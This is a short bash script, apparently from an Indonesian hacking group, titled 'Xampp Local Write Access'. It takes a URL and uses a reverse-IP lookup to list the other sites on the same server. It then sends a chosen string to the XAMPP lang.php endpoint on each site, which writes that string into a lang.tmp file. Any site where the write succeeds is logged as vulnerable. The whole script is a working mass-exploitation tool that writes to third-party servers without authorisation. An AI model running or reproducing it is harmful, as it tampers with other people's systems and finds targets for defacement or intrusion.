echo "Xampp Local Write Access"
echo "Coded By : D3r2y - ITW"
read -p "Url?: " url
read -p "Kata-Kata?: " word
curl -s -o resul.rsl https://api.hackertarget.com/reverseiplookup/?q=$url
for i in $(cat resul.rsl); do
curl -s -o /dev/null http://${i}/security/lang.php?"$word"
curl -s -o /dev/null http://${i}/xampp/lang.php?"$word"
if [ "$(curl -s ${i}/security/lang.tmp)" = "$word" ]; then
echo http://${i} ">>" Vuln!!
echo http://${i}/security/lang.tmp >> result.txt
elif [ "$(curl -s ${i}/xampp/lang.tmp)" = "$word" ]; then
echo http://${i} ">>" Vuln!!
echo http://${i}/xampp/lang.tmp >> result.txt
else
echo ${i} ">>" Not Vuln!!
fi; done
echo Result ">>" result.txt
rm resul.rsl